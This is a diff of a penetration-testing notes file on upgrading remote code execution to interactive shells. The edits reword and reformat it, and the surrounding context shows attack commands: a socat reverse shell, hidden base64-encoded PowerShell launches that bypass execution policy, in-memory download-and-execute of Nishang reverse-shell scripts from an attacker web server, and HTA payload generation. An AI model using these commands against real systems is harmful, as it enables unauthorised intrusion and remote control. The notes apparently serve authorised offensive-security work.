@@ -1,18 +1,19 @@
 # General - Shells
 
 The following note details the procedure and tools that can be used to leverage
-a RCE into a fully TTY shell.  
+a remote code execution into a fully `TTY` shell.
 
 For Windows credentials (password or hashes) reuse and direct lateral
 movements, refer to the `[Windows] Lateral movements` note.
 
 ### Miscellaneous
 
-The `rlwrap` utility runs the specified command and intercept further input to
-provide line editing and history functionalities. It is useful for the reverse
-shell one-liners and tools that do not natively implement those features (such
-as `netcat` for example) and for which use of the arrows keyboard keys result
-in `^[[C` / `^[[D` / `^[[A` / `^[[B`.
+The [`rlwrap`](https://github.com/hanslub42/rlwrap) utility runs the specified
+command and intercept further input to provide line editing and history
+functionalities. It is useful for the reverse shell one-liners and tools that
+do not natively implement those features (such as `netcat` for example) and
+for which use of the arrows keyboard keys result in `^[[C` / `^[[D` / `^[[A` /
+`^[[B`.
 
 ```
 rlwrap <COMMAND> [<ARGUMENTS>]
@@ -20,13 +21,14 @@ rlwrap <COMMAND> [<ARGUMENTS>]
 
 ### Detect firewall filtering
 
-A firewall may be configured on the targeted system to block inbound or outbound
-connection (TCP, UDP, ICMP). If TCP / UDP reverse shell attempts are failing
-but ICMP packets are received from the target, a firewall may be in deployed.
+A firewall may be configured on the targeted system to block inbound or
+outbound connection (`TCP`, `UDP`, `ICMP`). If `TCP` / `UDP` reverse shell
+attempts are failing but `ICMP` packets are received from the target, a
+firewall may be in deployed.
 
 ###### Outgoing traffic blocking
 
-Listen to ICMP traffic on host:
+`tcpdump` can be used to listen to `ICMP` traffic received on host:
 
 ```bash
 tcpdump -i <INTERFACE> icmp
@@ -315,9 +317,9 @@ socat tcp-connect:<IP>:<PORT> exec:"/bin/sh -li",pty,stderr,setsid,sigint,sane
 
 *Standalone one-liner*
 
-Starting PowerShell with the straight reverse shell command, `powershell -c
-<COMMAND>`, may results in error. Encoding and executing the command in
-`base64` oftentimes proves to be more successful.
+Starting PowerShell with the straight reverse shell command,
+`powershell -c <COMMAND>`, may results in error. Encoding and executing the
+command in `base64` oftentimes proves to be more successful.
 
 ```
 # Conversion to base64 in PowerShell.
@@ -336,7 +338,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <ENCODED_BASE64_CMD>
 
 *PowerCat*
 
-`powercat` is a PowerShell function, for Powershell Version 2 and later,
+`powercat` is a PowerShell function, for PowerShell Version 2 and later,
 providing the same functionalities as `netcat`.
 
 `powercat` can be used to transfer data and execute commands over TCP, UDP and
@@ -428,8 +430,9 @@ python -m SimpleHTTPServer <PORT>
 
 ###### PowerShell  
 
-The Nishang PowerShell scripts can be used to get a reverse shell.
-https://github.com/samratashok/nishang  
+The [`Nishang PowerShell`](https://github.com/samratashok/nishang) scripts can
+be used to get a reverse shell.
+
 The following commands will load directly in memory the PowerShell script hosted
 on the remote webserver:
 
@@ -441,7 +444,7 @@ powershell -nop -Win Hidden -exec bypass -c "IEX (New-Object Net.WebClient).Down
 powershell -nop -Win Hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-PowerShellIcmp.ps1'); Invoke-PowerShellIcmp -IPAddress <IP>"
 ```
 
-The Powershell script can also be started directly upon download if the invoke
+The PowerShell script can also be started directly upon download if the invoke
 command is added at the end of the script
 `Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <Port>`
 
@@ -499,11 +502,13 @@ The following HTA script can be used to load in memory and execute the
 </script>
 ```
 
-The Nishang's `Out-HTA` PowerShell cmdlet can be used as well to generate a
-HTA file with in-lined commands or that will download and execute a remote
-PowerShell script. It has the notable advantage of providing a failover
-mechanism: a live page related to Windows Defender from the Microsoft website
-is loaded if the HTA execution fails .
+The [Nishang's
+`Out-HTA`](https://github.com/samratashok/nishang/blob/master/Client/Out-HTA.ps1)
+PowerShell cmdlet can be used as well to generate a HTA file with in-lined
+commands or that will download and execute a remote PowerShell script. It has
+the notable advantage of providing a failover mechanism: a live page related to
+Windows Defender from the Microsoft website is loaded if the HTA execution
+fails.
 
 ```
 # Import-Module .\Out-HTA.ps1
@@ -514,9 +519,8 @@ Out-HTA -PayloadURL '<http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<PowerShell.ps1>'
 Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
 ```
 
-TODO
 
-#### Binary
+#### Complete reverse shell binaries
 
 ###### [Linux] C binary for SUID shell
 
